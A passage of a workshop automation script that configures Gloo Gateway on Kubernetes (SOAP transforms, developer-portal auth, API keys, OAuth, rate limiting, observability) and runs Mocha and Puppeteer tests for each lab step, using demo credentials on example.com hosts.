    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            xsltTransformation:
              xslt: |
                <?xml version="1.0" encoding="UTF-8"?>
                <xsl:stylesheet
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:math="http://www.w3.org/2005/xpath-functions/math"
                xmlns:xs="http://www.w3.org/2001/XMLSchema"
                exclude-result-prefixes="xs math" version="3.0">
                  <xsl:output indent="yes" omit-xml-declaration="yes" />
                  <xsl:strip-space elements="*"/>
                  <xsl:template match="/" xmlns="http://schemas.xmlsoap.org/soap/envelope/">
                    <Envelope >
                      <Header/>
                      <Body>
                        <Query>
                          <xsl:apply-templates select="json-to-xml(.)/*"/>
                        </Query>
                      </Body>
                    </Envelope>
                  </xsl:template>
                  <xsl:template match="map" xpath-default-namespace="http://www.w3.org/2005/xpath-functions" xmlns:web="http://www.qas.com/OnDemand-2011-03">
                    <CityQuery><xsl:value-of select="string[@key='cityQuery']" /></CityQuery>
                  </xsl:template>
                </xsl:stylesheet>
              nonXmlTransform: true
              setContentType: text/xml
          responseTransformation:
            xsltTransformation:
              xslt: |
                <?xml version="1.0" encoding="UTF-8"?>
                <xsl:stylesheet
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:xs="http://www.w3.org/2001/XMLSchema"
                xpath-default-namespace="http://schemas.xmlsoap.org/soap/envelope/"
                version="3.0">
                  <xsl:output method="text" omit-xml-declaration="yes" />
                  <xsl:variable name="myMap">
                    <map xmlns="http://www.w3.org/2005/xpath-functions">
                      <array key="matches" >
                        <xsl:for-each select="/Envelope/Body/Content/Match">
                          <map>
                            <string key="city"><xsl:value-of select="City"/></string>
                            <string key="country"><xsl:value-of select="Country" /></string>
                            <string key="subCountry"><xsl:value-of select="SubCountry" /></string>
                            <string key="geoNameId"><xsl:value-of select="GeoNameId" /></string>
                          </map>
                        </xsl:for-each>
                      </array>
                    </map>
                  </xsl:variable>
                  <xsl:template match="/">
                    <xsl:apply-templates select="xml-to-json(\$myMap, map{'indent': true()})" />
                  </xsl:template>
                </xsl:stylesheet>
              setContentType: application/json
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("World Cities API", () => {
  it('is included in the portal', () => helpers.checkBody({
    host: `https://portal.example.com`,
    path: '/v1/api-products',
    body: 'World Cities API',
    match: true,
  }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/world-cities/dev-portal-api-soap/tests/world-cities-exposed-portal.test.js.liquid from lab number 20"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - name: portal
      portalAuth:
        url: http://gateway-portal-web-server.gloo-system.svc.cluster.local:8080
        cacheDuration: 60s
        apiKeyHeader: "api-key"
        redisOptions:
          host: redis:6379
EOF
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const DeveloperPortalTeamsPage = require('./tests/pages/dev-portal/teams-page');
const DeveloperPortalAppsPage = require('./tests/pages/dev-portal/apps-page');
const DeveloperPortalAdminSubscriptionsPage = require('./tests/pages/dev-portal/admin-subscriptions-page');
const DeveloperPortalAdminAppsPage = require('./tests/pages/dev-portal/admin-apps-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;
const fs = require('fs');

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let devPortalTeamsPage;
  let devPortalAppsPage;
  let devPortalAdminSubscriptionsPage;
  let devPortalAdminAppsPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    const context = browser.defaultBrowserContext();
    await context.overridePermissions(`https://portal.example.com`, [
      "clipboard-read",
      "clipboard-write",
      "clipboard-sanitized-write",
    ]);
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    devPortalTeamsPage = new DeveloperPortalTeamsPage(page);
    devPortalAppsPage = new DeveloperPortalAppsPage(page);
    devPortalAdminSubscriptionsPage = new DeveloperPortalAdminSubscriptionsPage(page);
    devPortalAdminAppsPage = new DeveloperPortalAdminAppsPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

  it("user1 should be able to create a Team and add user2@solo.io as a member", async () => {
    await devPortalTeamsPage.navigateTo(`https://portal.example.com/teams`);
    await devPortalTeamsPage.createTeamAndAddUser('team1', 'team1', 'user2@solo.io');
  });

  it("user1 should be able to create an Application", async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.createNewApp('team1', 'app1', 'app1');
  });

  it("user1 should be able to subscribe to an API Product", async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    await devPortalAppsPage.createSubscription('BookInfo REST API');
  });

  it("logout and login as admin1", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("admin1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("admin1");
  });

  it("admin1 should be able to approve the subscription and add metadata", async () => {
    await devPortalAdminSubscriptionsPage.navigateTo(`https://portal.example.com/admin/subscriptions`);
    await devPortalAdminSubscriptionsPage.approveSubscription();
    await devPortalAdminSubscriptionsPage.addCustomMetadata('key', 'value');
    await devPortalAdminSubscriptionsPage.setRateLimit(5, 'MINUTE');
  });

  it("admin1 should be able to add application metadata", async () => {
    await devPortalAdminAppsPage.navigateTo(`https://portal.example.com/admin/apps`);
    await devPortalAdminSubscriptionsPage.addCustomMetadata('app', 'bookinfo');
  });

  it("logout and login as user1", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it('user1 should be able to create an API key', async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    
    // Create the API key and get its value
    const apiKey = await devPortalAppsPage.createApiKey('key1');
    
    // write API key to a file
    fs.writeFileSync('apiKey', apiKey);
  });
  
  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
export API_KEY=$(cat apiKey)
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 200 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: dynamic
  namespace: gloo-system
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: generic_key
            value: counter
        rateLimit:
          requestsPerUnit: 100
          unit: SECOND
    rateLimits:
    - setActions:
      - genericKey:
          descriptorValue: counter
      limit:
        dynamicMetadata:
          metadataKey:
            key: "envoy.filters.http.ext_authz"
            path:
            - key: "portal"
            - key: "rateLimit"
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
    # Rate limit configuration
    rateLimitConfigs:
      refs:
      - name: dynamic
        namespace: gloo-system
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 429 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
helm repo add gloo-portal-idp-connect https://storage.googleapis.com/gloo-mesh-enterprise/gloo-portal-idp-connect

helm upgrade -i -n gloo-system \
  portal-idp gloo-portal-idp-connect/gloo-portal-idp-connect \
  --version 0.3.0 \
  --kube-context $CLUSTER1 \
  -f -<<EOF
connector: keycloak
keycloak:
  realm: http://keycloak.keycloak.svc.cluster.local:8080/realms/portal-mgmt
  mgmtClientId: gloo-portal-idp
  mgmtClientSecret: gloo-portal-idp-secret
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-portal-idp-connect
helm upgrade -i -n gloo-system \
  gloo-gateway gloo-ee-helm/gloo-ee \
  --create-namespace \
  --version 1.18.8 \
  --kube-context ${CLUSTER1} \
  --reuse-values \
  -f -<<EOF
gateway-portal-web-server:
  enabled: true
  glooPortalServer:
    idpServerUrl: http://idp-connect.gloo-system.svc.cluster.local
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gateway-portal-web-server
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - name: oauth2
      oauth2:
        accessTokenValidation:
          jwt:
            remoteJwks:
              url: ${KEYCLOAK_URL}/realms/portal-mgmt/protocol/openid-connect/certs
    - name: portal
      portalAuth:
        url: http://gateway-portal-web-server.gloo-system.svc.cluster.local:8080
        cacheDuration: 60s
        redisOptions:
          host: redis:6379
EOF
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const DeveloperPortalTeamsPage = require('./tests/pages/dev-portal/teams-page');
const DeveloperPortalAppsPage = require('./tests/pages/dev-portal/apps-page');
const DeveloperPortalAdminSubscriptionsPage = require('./tests/pages/dev-portal/admin-subscriptions-page');
const DeveloperPortalAdminAppsPage = require('./tests/pages/dev-portal/admin-apps-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;
const fs = require('fs');

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI oauth", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let devPortalTeamsPage;
  let devPortalAppsPage;
  let devPortalAdminSubscriptionsPage;
  let devPortalAdminAppsPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    devPortalTeamsPage = new DeveloperPortalTeamsPage(page);
    devPortalAppsPage = new DeveloperPortalAppsPage(page);
    devPortalAdminSubscriptionsPage = new DeveloperPortalAdminSubscriptionsPage(page);
    devPortalAdminAppsPage = new DeveloperPortalAdminAppsPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it('user1 should be able to create an OAuth client', async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    
    // Create the API key and get its value
    const oauthClient = await devPortalAppsPage.createOAuthClient();
    
    // write API key to a file
    fs.writeFileSync('oauthClient', JSON.stringify(oauthClient));
  });
  
  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
export CLIENT_ID=$(cat oauthClient | jq -r .clientId)
export CLIENT_SECRET=$(cat oauthClient | jq -r .clientSecret)
export APP_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "grant_type=client_credentials" \
  "$KEYCLOAK_URL/realms/portal-mgmt/protocol/openid-connect/token" |
  jq -r .access_token)

echo export APP_TOKEN=${APP_TOKEN}
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.APP_TOKEN}], retCode: 429 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
helm repo update

helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
--version 0.97.1 \
--set mode=deployment \
--set image.repository="otel/opentelemetry-collector-contrib" \
--set command.name="otelcol-contrib" \
--namespace=otel \
--create-namespace \
-f -<<EOF
clusterRole:
  create: true
  rules:
  - apiGroups:
    - ''
    resources:
    - 'pods'
    - 'nodes'
    verbs:
    - 'get'
    - 'list'
    - 'watch'
ports:
  promexporter:
    enabled: true
    containerPort: 9099
    servicePort: 9099
    protocol: TCP
config:
  receivers:
    prometheus/gloo-dataplane:
      config:
        scrape_configs:
        # Scrape the Gloo Gateway pods
        - job_name: gloo-gateways
          honor_labels: true
          kubernetes_sd_configs:
          - role: pod
          relabel_configs:
            - action: keep
              regex: kube-gateway
              source_labels:
              - __meta_kubernetes_pod_label_gloo
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
              action: replace
              target_label: __metrics_path__
              regex: (.+)
            - action: replace
              source_labels:
              - __meta_kubernetes_pod_ip
              - __meta_kubernetes_pod_annotation_prometheus_io_port
              separator: ':'
              target_label: __address__
            - action: labelmap
              regex: __meta_kubernetes_pod_label_(.+)
            - source_labels: [__meta_kubernetes_namespace]
              action: replace
              target_label: kube_namespace
            - source_labels: [__meta_kubernetes_pod_name]
              action: replace
              target_label: pod
    prometheus/gloo-controlplane:
      config:
        scrape_configs:
        # Scrape the Gloo pods
        - job_name: gloo-gateways
          honor_labels: true
          kubernetes_sd_configs:
          - role: pod
          relabel_configs:
            - action: keep
              regex: gloo
              source_labels:
              - __meta_kubernetes_pod_label_gloo
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
              action: replace
              target_label: __metrics_path__
              regex: (.+)
            - action: replace
              source_labels:
              - __meta_kubernetes_pod_ip
              - __meta_kubernetes_pod_annotation_prometheus_io_port
              separator: ':'
              target_label: __address__
            - action: labelmap
              regex: __meta_kubernetes_pod_label_(.+)
            - source_labels: [__meta_kubernetes_namespace]
              action: replace
              target_label: kube_namespace
            - source_labels: [__meta_kubernetes_pod_name]
              action: replace
              target_label: pod
  exporters:
    prometheus:
      endpoint: 0.0.0.0:9099
    debug: {}
  service:
    pipelines:
      metrics:
        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
        processors: [batch]
        exporters: [prometheus]
EOF
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update

helm upgrade --install kube-prometheus-stack \
prometheus-community/kube-prometheus-stack \
--version 61.2.0 \
--namespace monitoring \
--create-namespace \
--values - <<EOF
grafana:
  service:
    type: LoadBalancer
    port: 3000
prometheus:
  prometheusSpec:
    ruleSelectorNilUsesHelmValues: false
    serviceMonitorSelectorNilUsesHelmValues: false
    podMonitorSelectorNilUsesHelmValues: false
EOF
cat <<EOF | kubectl apply -n otel -f -
apiVersion: monitoring.coreos.com/v1
kind: PodMonitor
metadata:
  name: otel-monitor
spec:
  podMetricsEndpoints:
  - interval: 30s
    port: promexporter
    scheme: http
  selector:
    matchLabels:
      app.kubernetes.io/name: opentelemetry-collector
EOF
kubectl -n monitoring create cm envoy-dashboard \
--from-file=data/steps/deploy-otel-collector/envoy.json
kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):3000"
